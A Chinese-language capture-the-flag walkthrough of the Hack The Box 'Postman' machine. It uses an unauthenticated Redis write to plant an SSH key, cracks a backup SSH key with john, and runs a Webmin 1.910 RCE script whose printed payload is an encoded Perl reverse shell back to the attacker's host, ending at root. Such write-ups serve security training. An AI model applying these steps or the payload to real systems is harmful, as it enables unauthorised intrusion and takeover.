# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
查看开通端口
```
┌──(root💀kali)-[~/htb/Postman]
└─# nmap -p- 10.10.10.160 --open
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-23 22:54 EST
Nmap scan report for 10.10.10.160
Host is up (0.31s latency).
Not shown: 64665 closed ports, 866 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 107.39 seconds

```

查看端口详细信息
```
┌──(root💀kali)-[~/htb/Postman]
└─# nmap -sV -T4 -A -O 10.10.10.160 -p 22,80,6379,10000
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-23 22:57 EST
Nmap scan report for 10.10.10.160
Host is up (0.26s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.2.2 (Linux 3.4) (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   251.42 ms 10.10.14.1
2   253.03 ms 10.10.10.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.24 seconds

```

先把靶机域名写进host文件
> echo "10.10.10.160 Postman" >> /etc/hosts

可以看到开了ssh服务，一个80端口的http服务，6379是redis服务，10000端口是webmin服务

webmin存在一个rce漏洞，但是需要登录账号和密码。

```
┌──(root💀kali)-[~/htb/Postman]
└─# searchsploit webmin 1.910                                                                     130 ⨯
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit | linux/remote/46984.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)         | linux/webapps/47330.rb
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

## redis 4.0.9

redis这个版本好像存在一个rce，但是试了几个exp都报错
> -ERR unknown command 'system.exec'

搜索了一圈，在[这个](https://serverfault.com/questions/1021564/redis-server-exploit-for-command-execution)帖子下看到一个答案
> The redis instance doesn't have MODULE command which is odd. If this is a CTF it might be intentional that the box creator removed it.

所以可能是被创建者人为移除了这个漏洞


在[hacktricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)找到了一个通过修改redis的ssh配置文件，从而无密码登录靶机的方法，步骤如下：

1. cli登录redis

> redis-cli -h 10.10.10.160

2. 使用get dir获取redis的安装目录
```
┌──(root💀kali)-[~/htb/Postman]
└─# redis-cli -h 10.10.10.160
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis"
```

现在我们知道redis安装在靶机的```/var/lib/redis```目录,这一步主要是用于写ssh文件。

3. kali端，把本地id_rsa.pub重定向到key.txt，需要注意要空两行

> (echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt


4. 把攻击机公钥写进靶机的```.ssh```

> cat key.txt | redis-cli -h 10.10.10.160 -x set ssh_key


5. 再次登录靶机redis，获取ssh_key值，成功显示，表示已经写入
```
┌──(root💀kali)-[~/htb/Postman]
└─# redis-cli -h 10.10.10.160
10.10.10.160:6379> GET ssh_key
"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDX....
```

6. 设置redis的dir目录

> CONFIG SET dir /var/lib/redis/.ssh

7. 设置dbfilename为authorized_keys

> dbfilename authorized_keys

8. 保存

> save

9. 退出redis终端，ssh登录
```
┌──(root💀kali)-[~/htb/Postman]
└─# ssh redis@10.10.10.160
The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
RSA key fingerprint is SHA256:FJdNat9qUrffCNDMV/0qF8efJdwa8NXW+iQ7NXuf/uk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.160' (RSA) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
redis@Postman:~$ whoami
redis

```

user.txt在用户matt下，redis账号没有权限

## 提权到matt

传linpeas，发现一个id_rsa.bak文件

```
╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak  
```

转成john可以识别的样式
```
┌──(root💀kali)-[~/htb/Postman]
└─# /usr/share/john/ssh2john.py id_rsa >crask
```

john破解
```
┌──(root💀kali)-[~/htb/Postman]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt crask
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:07 DONE (2021-12-25 01:04) 0.1290g/s 1850Kp/s 1850Kc/s 1850KC/sa6_123..*7¡Vamos!
Session completed

```

然而并不能直接登录
```
┌──(root💀kali)-[~/htb/Postman]
└─# ssh -i id_rsa matt@10.10.10.160                                                                                                                                                                                                                                                                                    130 ⨯
Enter passphrase for key 'id_rsa': 
Connection closed by 10.10.10.160 port 22

```

然后尝试用密码```computer2008```直接切换到Matt，成功了
```
redis@Postman:/opt$ su Matt
Password: 
Matt@Postman:/opt$ id
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
Matt@Postman:/opt$ whoami
Matt

```

# 提权

## webmin 1.910

webmin是一个基于web界面的类unix管理平台，由于需要管理系统的诸多类容，所以常常都是以root权限运行。
前面我们已经知道啊这个版本的webmin存在一个rce，如今我们又有了登录账号信息```Matt:computer2008```,现在我们可以利用这个rce提权

使用github上[这个RCE](https://github.com/NaveenNguyen/Webmin-1.910-Package-Updates-RCE/blob/master/exploit_poc.py)

先在kali开启一个监听
> nc -lnvp 4242

执行攻击：

```
┌──(root💀kali)-[~/htb/Postman]
└─# python3 exploit_poc.py --ip_address=10.10.10.160 --port=10000 --lhost=10.10.14.3 --lport=4242 --user=Matt --pass=computer2008

Webmin 1.9101- 'Package updates' RCE

[+] Generating Payload...
[+] Reverse Payload Generated : u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7Becho%2CcGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4zOjQyNDIiKTtTVERJTi0%2BZmRvcGVuKCRjLHIpOyR%2BLT5mZG9wZW4oJGMsdyk7d2hpbGUoPD4pe2lmKCRfPX4gLyguKikvKXtzeXN0ZW0gJDE7fX07Jw%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22&ok_top=Update+Selected+Packages
[+] Attempting to login to Webmin
[+] Login Successful
[+] Attempting to Exploit


```

拿到反弹shell

```
┌──(root💀kali)-[~/htb/Postman]
└─# nc -lnvp 4242                    
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.160] 36814
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root

```

已经成功提权到root